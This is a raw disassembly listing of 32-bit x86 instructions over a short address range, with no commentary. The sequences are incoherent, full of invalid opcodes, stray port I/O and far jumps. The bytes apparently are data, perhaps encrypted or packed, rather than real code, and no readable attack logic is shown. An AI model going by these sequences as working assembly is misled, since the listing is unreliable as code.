  4145f4:	mov    gs:0x3ccb283f,al
  4145fa:	mov    cl,0x7b
  4145fc:	int    0xcd
  4145fe:	out    dx,eax
  4145ff:	xchg   esi,eax
  414600:	mov    ebx,0xc4124f43
  414605:	xor    BYTE PTR [edx],0xd5
  414608:	mov    WORD PTR [ebx+0x4d],cs
  41460b:	pop    edx
  41460c:	sub    al,0xe
  41460e:	inc    ecx
  41460f:	cmp    al,BYTE PTR [eax]
	...
  414671:	add    BYTE PTR [eax],al
  414673:	add    BYTE PTR [edi+0x5e],bh
  414676:	cmc    
  414677:	ins    DWORD PTR es:[edi],dx
  414678:	cmc    
  414679:	out    dx,eax
  41467a:	call   FWORD PTR [esi+0x17]
  41467d:	enter  0xab7a,0x51
  414681:	sub    bl,BYTE PTR [edx+0x30]
  414684:	lock (bad) 
  414686:	add    BYTE PTR [eax],al
  414688:	add    al,0x1
  41468a:	add    BYTE PTR [eax],al
  41468c:	push   eax
  41468d:	add    al,0x5f
  41468f:	aaa    
  414690:	dec    ecx
  414691:	push   ebp
  414692:	sbb    ch,bh
  414694:	push   eax
  414695:	imul   BYTE PTR ds:0x794f7d98
  41469b:	lahf   
  41469c:	mov    ebp,0x9466f964
  4146a1:	and    BYTE PTR [ebx-0x4d],bl
  4146a4:	mov    cl,0xa2
  4146a6:	jno    0x414668
  4146a8:	cs ret 
  4146aa:	jns    0x414690
  4146ac:	or     edi,DWORD PTR [ebx+0x51]
  4146af:	cmp    BYTE PTR [eax+0x30789079],ch
  4146b5:	mov    eax,0x340a0729
  4146ba:	or     edx,DWORD PTR [esp+eax*4+0x2c]
  4146be:	enter  0xc92f,0x55
  4146c2:	cmp    eax,0xbd83686c
  4146c7:	sub    eax,0xe5e88d4b
  4146cc:	sahf   
  4146cd:	mov    dh,0xb5
  4146cf:	clc    
  4146d0:	mov    BYTE PTR [ebx],dh
  4146d2:	fmul   st(2),st
  4146d4:	sahf   
  4146d5:	(bad)  
  4146d6:	adc    DWORD PTR [esi-0x773bce8a],ebp
  4146dc:	add    DWORD PTR [edi-0x22dd5661],ecx
  4146e2:	in     al,0xd4
  4146e4:	enter  0x44e0,0xa8
  4146e8:	add    DWORD PTR ds:0xa12f0260,0x34
  4146ef:	aad    0x67
  4146f1:	or     ch,BYTE PTR [esi]
  4146f3:	dec    ebp
  4146f4:	dec    eax
  4146f5:	lahf   
  4146f6:	jne    0x4146c4
  4146f8:	push   edi
  4146f9:	xchg   DWORD PTR [edi+0x1fe54f73],edi
  4146ff:	sub    ah,BYTE PTR [ebp+0x72]
  414702:	out    0x9d,al
  414704:	ret    
  414705:	push   ds
  414706:	mov    esp,0x8e4b8f8e
  41470b:	loope  0x414712
  41470d:	imul   ecx,DWORD PTR [ebp-0x16],0xffffffbe
  414711:	sub    BYTE PTR [esi],0x4c
  414714:	pop    ecx
  414715:	ins    DWORD PTR es:[edi],dx
  414716:	aas    
  414717:	or     al,0x82
  414719:	ss adc eax,0x1f2acb13
  41471f:	ret    
  414720:	pop    DWORD PTR [eax+eax*4]
  414723:	(bad)
  414726:	cmp    al,0xcf
  414728:	in     al,0xbc
  41472a:	dec    edi
  41472b:	cmp    al,0xde
  41472d:	push   esi
  41472e:	sbb    eax,0xca7de7eb
  414733:	push   cs
  414734:	cwde   
  414735:	(bad)  
  414736:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  414737:	(bad)  
  414739:	push   ebx
  41473a:	push   cs
  41473b:	sbb    BYTE PTR [ecx+0xa],bh
  41473e:	shl    DWORD PTR [eax+0x4c37a844],1
  414744:	jmp    0x414783
  414746:	and    BYTE PTR [edi+edx*8],bh
  414749:	int3   
  41474a:	lock je 0x41474e
  41474d:	pop    esp
  41474e:	push   es
  41474f:	(bad)  
  414750:	lods   eax,DWORD PTR ds:[esi]
  414751:	and    edx,DWORD PTR [edx-0x10]
  414754:	mov    ds:0x716af422,eax
  414759:	inc    esp
  41475a:	jae    0x4146f6
  41475c:	push   ebx
  41475d:	mov    cl,dl
  41475f:	out    0x51,al
  414761:	and    cl,BYTE PTR [edi-0x23]
  414764:	mov    ecx,0x467226e2
  414769:	test   al,0x50
  41476b:	push   edi
  41476c:	jbe    0x4147af
  41476e:	mov    cx,0x2106
  414772:	mov    al,ds:0x40055e29
  414777:	sahf   
  414778:	dec    ebx
  414779:	jnp    0x4147b8
  41477b:	call   0xee7b5e78
  414780:	dec    ebx
  414781:	aas    
  414782:	enter  0x8a84,0xf2
  414786:	push   ebx
  414787:	mov    ebp,0x2e63d54b
  41478c:	out    dx,al
  41478d:	ds out 0x57,al
	...
  4147f4:	jle    0x414825
  4147f6:	add    DWORD PTR [ebp+0x51],ebp
  4147f9:	outs   dx,DWORD PTR ds:[esi]
  4147fa:	jle    0x41483b
  4147fc:	aas    
  4147fd:	mov    BYTE PTR [esi],cl
  4147ff:	cmp    eax,0x62250f28
  414804:	hlt    
  414805:	xlat   BYTE PTR ds:[ebx]
  414806:	add    BYTE PTR [eax],al
  414808:	add    al,0x1
  41480a:	add    BYTE PTR [eax],al
  41480c:	test   eax,0x9c35d62d
  414811:	jle    0x414841
  414813:	mov    eax,0x7aae697c
  414818:	adc    al,0x18
  41481a:	(bad)
  41481d:	pop    ss
  41481e:	sbb    DWORD PTR [ecx+0x3c890a06],edi
  414824:	and    edx,DWORD PTR [edi+ebx*8]
  414827:	(bad)  
  414828:	out    0x8c,al
  41482a:	out    dx,eax
  41482b:	and    DWORD PTR [edi],0xffffff87
  41482e:	sub    eax,0x4b03e339
  414833:	std    
  414834:	mov    eax,DWORD PTR [esi]
  414836:	lock sub BYTE PTR [eax-0xb],ch
  41483a:	dec    ebp
  41483b:	nop
  41483c:	xor    esi,ecx
  41483e:	xor    BYTE PTR [ebp-0xe],bh
  414841:	in     al,dx
  414842:	mov    esp,esi
  414844:	adc    ah,BYTE PTR [edi-0x3a]
  414847:	out    dx,al
  414848:	shr    DWORD PTR [edi+0x2d0661d9],1
  41484e:	outs   dx,BYTE PTR ds:[esi]
  41484f:	call   0x1221:0x8bea3f8f
  414856:	ins    BYTE PTR es:[edi],dx
  414857:	push   ds
  414858:	cmp    ah,BYTE PTR [edi+0x4e18e771]
  41485e:	mov    ebp,0xa9dc70ba
  414863:	mov    dl,cl
  414865:	ins    BYTE PTR es:[edi],dx
  414866:	cmp    eax,0xbe7a66b5
  41486b:	sub    BYTE PTR ds:0xad35794b,bl
  414871:	sub    eax,0x71544432
  414876:	push   ecx
  414877:	mov    al,ds:0xaf851432
  41487c:	sbb    eax,0xd855ed59
  414881:	(bad)  
  414882:	mov    ah,0x33
  414884:	das    
  414885:	adc    BYTE PTR [ebp-0x12],0xc7
  414889:	inc    edi
  41488a:	inc    eax
  41488b:	jmp    0x6990ecc7
  414890:	(bad)  
  414891:	shl    BYTE PTR [ebp-0x3e668514],cl
  414897:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  414898:	jbe    0x4148fd
  41489a:	dec    edi
  41489b:	and    eax,0x52ee1af5
  4148a0:	stc    
  4148a1:	popa   
  4148a2:	nop
  4148a3:	sbb    eax,0x5ceeace4
  4148a8:	push   ds
  4148a9:	cmp    BYTE PTR [ecx+0x6e],ch
  4148ac:	and    DWORD PTR [esi-0x56edfe52],0x5055f455
  4148b6:	and    eax,DWORD PTR [edx]
  4148b8:	nop
  4148b9:	in     eax,0xb6
  4148bb:	mov    BYTE PTR [edi-0x59],bh
  4148be:	bound  eax,QWORD PTR [ebp+0x1b254c83]
  4148c4:	cmp    BYTE PTR [ecx],bl
  4148c6:	mov    esp,0xdede7054
  4148cb:	adc    ch,dh
  4148cd:	and    cl,BYTE PTR [edi]
  4148cf:	sub    al,0x3d
  4148d1:	add    al,0xef
  4148d3:	sti    
  4148d4:	shl    BYTE PTR [edi+0x6e],cl
  4148d7:	mov    ebp,0x21064301
  4148dc:	push   eax
  4148dd:	push   edx
  4148de:	cs fdiv st,st(2)
  4148e1:	mov    eax,ds:0xbe49cc84
  4148e6:	leave  
  4148e7:	out    dx,eax
  4148e8:	popa   
  4148e9:	addr16 das 
  4148eb:	xor    DWORD PTR [edx],ebp
  4148ed:	je     0x414934
  4148ef:	call   0x4fdc:0x40cad56e
  4148f6:	cmp    ebp,DWORD PTR [ebp-0x193c7508]
  4148fc:	dec    eax
  4148fd:	xor    al,0x3
  4148ff:	inc    esp
  414900:	stos   DWORD PTR es:[edi],eax
  414901:	push   es
  414902:	mov    fs,WORD PTR [eax+0x47bc353c]
  414908:	pop    ss
  414909:	outs   dx,DWORD PTR ds:[esi]
  41490a:	mov    esp,0xeec74f13
  41490f:	fadd   QWORD PTR [eax]
	...
  414971:	add    BYTE PTR [eax],al
  414973:	add    BYTE PTR [ebx],cl
  414975:	jle    0x414949
  414977:	and    esi,edi
  414979:	scas   eax,DWORD PTR es:[edi]
  41497a:	sti    
  41497b:	jle    0x414963
  41497d:	pop    edx
  41497e:	push   ds
  41497f:	pop    es
  414980:	das    
  414981:	out    dx,al
  414982:	jmp    0x400:0xd8f842
  414989:	add    DWORD PTR [eax],eax
  41498b:	add    BYTE PTR [ebx+0x1a43c0d3],dl
  414991:	pop    ebx
  414992:	xchg   edi,eax
  414993:	push   ds
  414994:	pop    esp
  414995:	mov    ebx,0xe4f5cebf
  41499a:	xchg   esi,eax
  41499b:	and    al,0xc0
  41499d:	cli    
  41499e:	shl    edi,1
  4149a0:	lahf   
  4149a1:	and    edi,DWORD PTR [esi-0x42a21f53]
  4149a7:	loop   0x4149d7
  4149a9:	mov    ah,0xf3
  4149ab:	lahf   
  4149ac:	faddp  st(4),st
  4149ae:	pop    es
  4149af:	and    ah,bh
  4149b1:	jge    0x41499b
  4149b3:	hlt    
  4149b4:	push   ebp
  4149b5:	cmp    al,0xfd
  4149b7:	mov    ch,0xa5
  4149b9:	retf   
  4149ba:	fstp   DWORD PTR [ebx]
  4149bc:	(bad)  
  4149be:	push   ds
  4149bf:	cmp    eax,0xac5e769
  4149c4:	lea    ecx,[edi+0xf4b9c9e]
  4149ca:	fstp   DWORD PTR [edi]
  4149cc:	xor    al,0xe2
  4149ce:	push   ecx
  4149cf:	mov    al,0x1
  4149d1:	pusha  
  4149d2:	mov    dl,0xe0
  4149d4:	push   0x62
  4149d6:	add    eax,0x44814523
  4149db:	mov    al,0x3c
  4149dd:	mov    eax,0x7278773c
  4149e2:	aaa    
  4149e3:	or     al,0xa3
  4149e5:	adc    bl,BYTE PTR [esi-0x77]
  4149e8:	jp     0x414985
  4149ea:	xor    edi,edi
  4149ec:	add    BYTE PTR [eax+ebp*2],ah
  4149ef:	pop    edi
  4149f0:	add    eax,0x2cd00eb0
  4149f5:	dec    edx
  4149f6:	xor    DWORD PTR [edx-0x5defcf8b],edx
  4149fc:	dec    esi
  4149fd:	or     eax,DWORD PTR [ecx+0x74fc728a]
  414a03:	jge    0x414a76
  414a05:	adc    al,0x7a
  414a07:	scas   eax,DWORD PTR es:[edi]
  414a08:	cld    
  414a09:	dec    esi
  414a0a:	xchg   ebp,eax
  414a0c:	adc    eax,0xfa132166
  414a11:	(bad)  
  414a12:	and    BYTE PTR [edx+eiz*4-0x4f],ch
  414a16:	or     dl,cl
  414a18:	xchg   edx,eax
  414a19:	pop    DWORD PTR [eax+0x71d69cc8]
  414a1f:	sbb    BYTE PTR [ebx+0x46],ah
  414a22:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  414a23:	inc    ebp
  414a24:	rcl    DWORD PTR [esi-0x72bbd988],1
  414a2a:	adc    dl,BYTE PTR [eax]
  414a2c:	jg     0x414a1e
  414a2e:	inc    eax
  414a2f:	adc    eax,0x5976e5fd
  414a34:	test   DWORD PTR [edx],0x98d5cfdc
  414a3a:	fisubr DWORD PTR [edx+0x2b709ea6]
  414a40:	inc    esp
  414a41:	inc    ebp
  414a42:	cli    
  414a43:	das    
  414a44:	push   0xfffffffa
  414a46:	xchg   bh,ah
  414a48:	jnp    0x414a21
  414a4a:	pop    ds
  414a4b:	ret    0x1568
  414a4e:	or     BYTE PTR [ebp-0x7f6c028d],cl
  414a54:	fild   QWORD PTR [eax+0x2d]
  414a57:	test   DWORD PTR [edx],edi
  414a59:	in     al,dx
  414a5a:	pop    esp
  414a5b:	idiv   BYTE PTR [ecx]
  414a5d:	sbb    dl,bl
  414a5f:	pop    edx
  414a60:	retf   
  414a61:	cwde   
  414a62:	sub    BYTE PTR [edx+0x7a2f07b9],0x9d
  414a69:	out    dx,al
  414a6a:	sub    DWORD PTR ds:0xb781679,esi
  414a70:	push   cs
  414a71:	aaa    
  414a72:	sub    al,0xab
  414a74:	out    dx,eax
  414a75:	mov    bh,0x18
  414a77:	dec    eax
  414a78:	add    al,0xad
  414a7a:	aas    
  414a7b:	repz in eax,dx
  414a7d:	dec    ebx
  414a7e:	mov    edx,0x85ffdb2c
  414a83:	jmp    0x79f24421
  414a88:	(bad)  
  414a89:	not    cl
  414a8b:	aam    0xd0
  414a8d:	hlt    
  414a8e:	push   es
  414a8f:	retf   0x0
	...
  414af2:	add    BYTE PTR [eax],al
  414af4:	lahf   
  414af5:	fnstcw WORD PTR [esi]
  414af7:	ss jle 0x414af1
  414afa:	lahf   
  414afb:	stc    
  414afc:	bound  esp,QWORD PTR [ebx+0x182c63d9]
  414b02:	and    al,0xbb
  414b04:	cld    
  414b05:	fld    DWORD PTR [eax]
  414b07:	add    BYTE PTR [ecx+eax*1],al
  414b0a:	add    BYTE PTR [eax],al
  414b0c:	iret   
  414b0d:	push   esp
  414b0e:	test   al,0xb9
  414b10:	push   esi
  414b11:	add    DWORD PTR [esi-0x68e1eaf8],eax
  414b17:	jnp    0x414af0
  414b19:	jg     0x414b09
  414b1b:	jne    0x414ae8
  414b1d:	ja     0x414b30
  414b1f:	in     al,dx
  414b20:	add    ch,BYTE PTR [ebx]
  414b22:	int3   
  414b23:	cwde   
  414b24:	mov    eax,DWORD PTR ds:0x46d1b385
  414b2a:	lahf   
  414b2b:	mov    cl,0xdd
  414b2d:	mov    dh,0xbf
  414b2f:	lahf   
  414b30:	jmp    0x8fc2:0x9da81318
  414b37:	push   edi
  414b38:	data16 cmc 
  414b3a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  414b3b:	inc    edx
  414b3c:	xor    al,0x44
  414b3e:	loop   0x414b62
  414b40:	push   es
  414b41:	dec    esi
  414b42:	add    edx,DWORD PTR [edi+0x5b]
  414b45:	inc    esi
  414b46:	jo     0x414b27
  414b48:	or     al,0x1
  414b4a:	mov    eax,0x6e21a52c
  414b4f:	adc    BYTE PTR [edi-0x613562a],dl
  414b55:	jmp    0x414b44
  414b57:	mov    WORD PTR [edi-0x422a60bd],?
  414b5d:	adc    bh,0x7f
  414b60:	mov    al,0x91
  414b62:	inc    edx
  414b63:	ins    BYTE PTR es:[edi],dx
  414b64:	inc    esi
  414b65:	add    ebp,DWORD PTR [ebp+0x70]
  414b68:	xchg   ebp,eax
  414b69:	jge    0x414b10
  414b6b:	pop    ecx
  414b6c:	xor    BYTE PTR ds:0xfe2beaa4,dh
  414b72:	scas   al,BYTE PTR es:[edi]
  414b73:	xchg   cl,cl
  414b75:	pop    eax
  414b76:	mov    ds:0xf23eaa4f,al
  414b7b:	call   0xf19c:0x79c92374
  414b82:	les    ebx,FWORD PTR [esi-0x75]
  414b85:	sbb    bl,BYTE PTR [edx+ecx*1-0x26]
  414b89:	enter  0x5b68,0x9f
  414b8d:	sets   BYTE PTR [si]
  414b91:	add    dh,BYTE PTR [eax+0x6c09633]
  414b97:	push   ecx
  414b98:	push   cs
  414b99:	pop    edx
  414b9a:	jp     0x414b87
  414b9c:	pop    eax
  414b9d:	nop
  414b9e:	dec    edi
  414b9f:	sub    al,0x4f
  414ba1:	push   ebp
  414ba2:	rol    BYTE PTR [ecx],1
  414ba4:	inc    ecx
  414ba5:	loop   0x414bc2
  414ba7:	adc    al,0x5d
  414ba9:	jnp    0x414bf3
  414bab:	or     cl,al
  414bad:	jb     0x414b6f
  414baf:	cmp    ah,BYTE PTR [edi+esi*4+0x54]
  414bb3:	daa    
  414bb4:	mov    DWORD PTR [esi],ebx
  414bb6:	out    dx,eax
  414bb7:	(bad)  
  414bb8:	jg     0x414ba1
  414bba:	(bad)  
  414bbb:	lock add BYTE PTR [edx],ch
  414bbe:	cld    
  414bbf:	push   ebx
  414bc0:	out    dx,eax
  414bc1:	leave  
  414bc2:	dec    edx
  414bc3:	enter  0xe279,0xab
  414bc7:	jmp    0xd9153fbe
  414bcc:	push   edi
  414bcd:	test   DWORD PTR [ecx-0x7d5b163d],ebp
  414bd3:	imul   DWORD PTR [ebx]
  414bd5:	sbb    eax,0x843c7434
  414bda:	call   0xf897dcff
  414bdf:	push   cs
  414be0:	aas    
  414be1:	inc    ebp
  414be2:	stos   BYTE PTR es:[edi],al
  414be3:	pop    edx
  414be4:	add    eax,0x4260838e
  414be9:	in     eax,dx
  414bea:	xor    eax,DWORD PTR [esi+0x64fe9c5a]
  414bf0:	sar    DWORD PTR [ebx+0x1c4b6ef0],cl
  414bf6:	xor    BYTE PTR [eiz*1+0x3af2e7a],dh
  414bfd:	adc    al,0x5d
  414bff:	xchg   edx,eax
  414c00:	jne    0x414c3e
  414c02:	jb     0x414bb1
  414c04:	(bad)  
  414c05:	mov    es,WORD PTR fs:[eax+0x7095ad3a]
  414c0c:	cs pop ds
  414c0e:	xchg   esp,eax
  414c0f:	sbb    al,0x0
	...
  414c71:	add    BYTE PTR [eax],al
  414c73:	add    BYTE PTR [esp+eiz*2],dh
  414c76:	push   ds
  414c77:	jl     0x414cd7
  414c79:	jle    0x414cf1
  414c7b:	ins    BYTE PTR es:[edi],dx
  414c7c:	out    0x12,al
  414c7e:	adc    ecx,DWORD PTR cs:[ecx+ebp*8-0x24ff7359]
  414c86:	add    BYTE PTR [eax],al
  414c88:	add    al,0x1
  414c8a:	add    BYTE PTR [eax],al
  414c8c:	stos   BYTE PTR es:[edi],al
  414c8d:	pop    esi
  414c8e:	mov    al,ds:0x298e71b
  414c93:	nop
  414c94:	popf   
  414c95:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  414c96:	fimul  DWORD PTR [ecx]
  414c98:	and    BYTE PTR [edi],cl
  414c9a:	xchg   ecx,eax
  414c9b:	mov    eax,ds:0x3a7ee94a
  414ca0:	or     ax,0xc315
  414ca4:	leave  
  414ca5:	fild   DWORD PTR [ecx]
  414ca7:	bound  edx,QWORD PTR [edx+0x19]
  414caa:	nop
  414cab:	push   edx
  414cac:	cmp    al,BYTE PTR [ecx]
  414cae:	add    BYTE PTR [edx],bl
  414cb0:	and    eax,0xea8ffa0c
  414cb5:	jb     0x414d06
  414cb7:	jo     0x414d37
  414cb9:	adc    eax,0x809ad1f9
  414cbe:	fbld   TBYTE PTR [ebp+0xf]
  414cc1:	pop    es
  414cc2:	mov    ds:0x1ef66e5f,eax
  414cc7:	and    cl,BYTE PTR [eax]
  414cc9:	das    
  414cca:	and    al,0x6
  414ccc:	xor    ch,BYTE PTR [eax+0x5954bbb1]
  414cd2:	cld    
  414cd3:	rol    DWORD PTR [ebp-0x76],cl
  414cd6:	ss hlt 
  414cd8:	nop
  414cd9:	ret    
  414cda:	shr    eax,0x23
  414cdd:	(bad)  
  414cde:	int3   
  414cdf:	test   BYTE PTR ds:[esi],dl
  414ce2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  414ce3:	ins    DWORD PTR es:[edi],dx
  414ce4:	out    0x51,al
  414ce6:	std    
  414ce7:	adc    BYTE PTR [esi+0x6af65f2c],dh
  414ced:	add    eax,DWORD PTR [edi+0x20]
  414cf0:	ss int 0xea
  414cf3:	mov    esi,0x366cfdf7
  414cf8:	jne    0x414d34
  414cfa:	scas   eax,DWORD PTR es:[edi]
  414cfb:	mov    edx,DWORD PTR [eax+0x63fac1b3]
  414d01:	imul   ecx,DWORD PTR [esi],0xffffffe3
  414d04:	jae    0x414cc1
  414d06:	pop    edi
  414d07:	xchg   BYTE PTR [edx],dl
  414d09:	mov    ch,0xcb
  414d0b:	call   0xa230:0xb861ac34
  414d12:	(bad)
  414d15:	out    0x18,eax
  414d17:	sub    DWORD PTR [eax],esi
  414d19:	adc    al,0xaf
  414d1b:	out    dx,eax
  414d1c:	ins    DWORD PTR es:[edi],dx
  414d1d:	loop   0x414d89
  414d1f:	fcom   DWORD PTR [esi+0x63]
  414d22:	mov    edi,0xb39fe3c1
  414d27:	inc    ebx
  414d28:	lds    ebp,FWORD PTR ss:[ebx+0x743992f]
  414d2f:	stc    
  414d30:	xchg   edi,eax
  414d31:	and    ecx,DWORD PTR [eax]
  414d33:	neg    ebp
  414d35:	mov    gs,WORD PTR [ebx+0x6761615d]
  414d3b:	shl    BYTE PTR [eax],1
  414d3d:	lock (bad) 
  414d3f:	lods   al,BYTE PTR ds:[esi]
  414d40:	test   BYTE PTR [ebx],cl
  414d42:	out    0x50,eax
  414d44:	call   0x4c5b:0x8c50df40
  414d4b:	test   eax,0x7e75febe
  414d50:	sbb    dx,0xb67b
  414d55:	test   al,0xbd
  414d57:	push   cs
  414d58:	sub    esp,esi
  414d5a:	jno    0x414d26
  414d5c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  414d5d:	mov    eax,ds:0xbc8fdd4e
  414d62:	aaa    
  414d63:	xchg   ecx,eax
  414d64:	sbb    eax,0x7d5d0642
  414d69:	imul   edi,DWORD PTR [ebp+0x3e],0x65381302
  414d70:	mov    bh,0xae
  414d72:	(bad)  
  414d73:	mov    esp,0x8ae274
  414d78:	iret   
  414d79:	and    BYTE PTR [esp+eiz*8-0x3e16f939],0x30
  414d81:	clc    
  414d82:	in     eax,dx
  414d83:	lods   eax,DWORD PTR ds:[esi]
  414d84:	and    BYTE PTR [ebx+0x5b],bl
  414d87:	fiadd  WORD PTR [edi]
  414d89:	push   ebx
  414d8a:	add    bh,BYTE PTR [ecx-0x145a3f77]
	...
  414df4:	mov    bh,0x99
  414df6:	adc    dl,BYTE PTR [ecx-0x404864c2]
  414dfc:	in     al,dx
  414dfd:	xor    dh,BYTE PTR [esi]
  414dff:	adc    eax,0x42ec5ea7
  414e04:	add    al,0xdc
  414e06:	add    BYTE PTR [eax],al
  414e08:	add    al,0x1
  414e0a:	add    BYTE PTR [eax],al
  414e0c:	dec    edi
  414e0d:	out    dx,eax
  414e0e:	add    DWORD PTR [ebp+0x33],0x4b
  414e12:	adc    bh,0x67
  414e15:	add    al,0x89
  414e17:	pop    eax
  414e18:	call   0x92fe:0x5210eb5c
  414e1f:	cmc    
  414e20:	xor    al,0x8a
  414e22:	(bad)  
  414e23:	pop    esi
  414e24:	push   ss
  414e25:	xor    al,0xc6
  414e27:	ja     0x414dc5
  414e29:	pop    ss
  414e2a:	xchg   esp,eax
  414e2b:	dec    edx
  414e2c:	shl    DWORD PTR [ecx+eax*4-0xf760603],cl
  414e33:	xchg   esi,eax
  414e34:	cs rcl eax,cl
  414e37:	mov    edx,0x2cf137d9
  414e3c:	stc    
  414e3d:	out    0xf9,eax
  414e3f:	inc    ebp
  414e40:	xor    DWORD PTR [esi-0x23],edi
  414e43:	popf   
  414e44:	push   es
  414e45:	lock inc esi
  414e47:	or     BYTE PTR [eax],0xf4
  414e4a:	add    al,0x2
  414e4c:	inc    eax
  414e4d:	aas    
  414e4e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  414e4f:	out    dx,eax
  414e50:	stos   DWORD PTR es:[edi],eax
  414e51:	xchg   BYTE PTR [ebp+0x22],ah
  414e54:	push   DWORD PTR [edx+0x6ab14688]
  414e5a:	push   eax
  414e5b:	shl    DWORD PTR [edx+0x59],1
  414e5e:	sbb    al,0xfb
  414e60:	or     eax,0xf8b75c46
  414e65:	dec    eax
  414e66:	arpl   WORD PTR [edx],bx
  414e68:	pop    es
  414e69:	sahf   
  414e6a:	retf   0x5cfd
  414e6d:	mov    ah,bl
  414e6f:	outs   dx,DWORD PTR ds:[esi]
  414e70:	cmp    al,BYTE PTR [ebx+0x33db2099]
  414e76:	loopne 0x414e47
  414e78:	adc    eax,0x11de8838
  414e7d:	dec    esp
  414e7e:	xchg   ecx,eax
  414e7f:	jge    0x414e6f
  414e81:	cs jne 0x414e49
  414e84:	ror    DWORD PTR [ebx+0x3e08b36e],1
  414e8a:	(bad)  
  414e8b:	xchg   ebp,eax
  414e8c:	ja     0x414e46
  414e8e:	les    ecx,FWORD PTR [eax-0x6f]
  414e91:	fst    DWORD PTR [ebp+0x7]
  414e94:	aas    
  414e95:	mov    DWORD PTR [edi+0x17],edx
  414e98:	jge    0x414e34
  414e9a:	lea    ebp,[edx+0x3c3af772]
  414ea0:	mov    bl,0xb1
  414ea2:	ror    al,1
  414ea4:	jmp    0xf754:0xbbcbd6d5
  414eab:	stc    
  414eac:	inc    eax
  414ead:	cli    
  414eae:	mov    ebx,DWORD PTR [esi-0x41]
  414eb1:	retf   0x81cc
  414eb4:	cmp    BYTE PTR [edx-0x3a],ch
  414eb7:	ss inc esp
  414eb9:	jae    0x414f06
  414ebb:	jne    0x414e93
  414ebd:	stos   BYTE PTR es:[edi],al
  414ebe:	sub    al,BYTE PTR [ebp+ebx*1-0xa7d584]
  414ec5:	je     0x414e8c
  414ec7:	push   ecx
  414ec8:	add    cl,BYTE PTR [edx-0x3392912e]
  414ece:	iret   
  414ecf:	xchg   BYTE PTR [edi-0x6c],dh
  414ed2:	push   esi
  414ed3:	xor    cl,0xf3
  414ed6:	jle    0x414f55
  414ed8:	push   ds
  414ed9:	xchg   ebx,eax
  414eda:	repz jae 0x414ed2
  414edd:	lahf   
  414ede:	xor    eax,0xe904c64
  414ee3:	retf   
  414ee4:	or     eax,0x92a93082
  414ee9:	aaa    
  414eea:	jo     0x414ed0
  414eec:	and    ecx,edi
  414eee:	mov    BYTE PTR [ebx+0x4c],bl
  414ef1:	dec    ebp
  414ef2:	inc    ebp
  414ef3:	mov    eax,ds:0xf694d9b7
  414ef8:	fnstcw WORD PTR [esi+0x60]
  414efb:	sbb    bh,BYTE PTR [eax]
  414efd:	(bad)  
  414efe:	in     al,dx
  414eff:	test   BYTE PTR [eax],dl
  414f01:	jns    0x414f2f
  414f03:	fcmovb st,st(7)
  414f05:	je     0x414ec7
  414f07:	inc    ebx
  414f08:	(bad)  
  414f09:	in     eax,0xa5
  414f0b:	inc    esp
  414f0c:	daa    
  414f0d:	test   ecx,edx
  414f0f:	and    al,BYTE PTR [eax]
	...
  414f71:	add    BYTE PTR [eax],al
  414f73:	add    BYTE PTR [edi],dh
  414f75:	data16 xor al,0x9b
  414f78:	jne    0x414f55
  414f7a:	mov    edi,0xe45ae5ee
  414f7f:	call   0xdd08:0x5a07a7b8
  414f86:	add    BYTE PTR [eax],al
  414f88:	add    al,0x1
  414f8a:	add    BYTE PTR [eax],al
  414f8c:	jmp    0x414ff8
  414f8e:	lds    esp,FWORD PTR [ebx]
  414f90:	pop    ss
  414f91:	or     al,0x89
  414f93:	push   ss
  414f94:	cmp    al,BYTE PTR [eax-0x4d]
  414f97:	mov    edi,0x25925fa9
  414f9c:	pop    eax
  414f9d:	retf   
  414f9e:	sub    al,0xaa
  414fa0:	test   BYTE PTR [eax+0x2890c4e2],al
  414fa6:	cwde   
  414fa7:	xor    eax,DWORD PTR [eax-0x1484ca56]
  414fad:	(bad)  
  414fae:	jecxz  0x414fc9
  414fb0:	fwait
  414fb1:	push   ds
  414fb2:	pop    esi
  414fb3:	fcomi  st,st(4)
  414fb5:	mov    edi,0xbaf755f6
  414fba:	ja     0x41500e
  414fbc:	fstp   TBYTE PTR [edi-0x58]
  414fbf:	cld    
  414fc0:	sbb    edi,esp
  414fc2:	sub    ecx,edx
  414fc4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  414fc5:	sbb    ch,BYTE PTR [esi]
  414fc7:	pop    ecx
  414fc8:	mov    bl,0xa7
  414fca:	xchg   ecx,eax
  414fcb:	push   edi
  414fcc:	pop    edx
  414fcd:	sub    dl,BYTE PTR [ebx+0x49]
  414fd0:	test   al,0x12
  414fd2:	repnz stos DWORD PTR es:[edi],eax
  414fd4:	mov    bl,0x71
  414fd6:	fdivr  DWORD PTR [ecx+0x7cf4ca48]
  414fdc:	sbb    bh,BYTE PTR [ebx*4-0x45e4aa18]
  414fe3:	xchg   esi,eax
  414fe4:	lods   al,BYTE PTR ds:[esi]
  414fe5:	xchg   esp,eax
  414fe6:	call   FWORD PTR [ebx-0x39]
  414fe9:	mov    edx,DWORD PTR [ecx-0x43fb1481]
  414fef:	sub    eax,DWORD PTR [edi+esi*4]
  414ff2:	add    ebp,DWORD PTR [edx+0x32]
  414ff5:	das    
  414ff6:	pop    es
  414ff7:	adc    al,0x4d
  414ff9:	xchg   BYTE PTR [esi-0x39],cl
  414ffc:	stc    
  414ffd:	lahf   
  414ffe:	es add al,0x36
  415001:	mov    dh,0x58
  415003:	xchg   ecx,eax
  415004:	and    BYTE PTR [ecx+0xd],dl
  415007:	pop    edi
  415008:	xor    BYTE PTR [ebp+esi*4-0x1f],bl
  41500c:	ret    0x50b0
  41500f:	data16 stos BYTE PTR es:[edi],al
  415011:	jmp    0xb850:0xa077a542
  415018:	or     dh,BYTE PTR [edx+ebp*1-0x386f38f5]
  41501f:	xor    DWORD PTR [ebp+0x1b],esi
  415022:	scas   al,BYTE PTR es:[edi]
  415023:	pop    eax
  415024:	xchg   ebp,eax
  415025:	shr    BYTE PTR [edx-0x5867d63e],0x2
  41502c:	pop    es
  41502d:	imul   eax,DWORD PTR ds:[esi],0x6d26feda
  415034:	mov    ebx,0x7a526da7
  415039:	xchg   edx,eax
  41503a:	je     0x415039
  41503c:	arpl   WORD PTR [esi],sp
  41503e:	and    BYTE PTR [ecx],dl
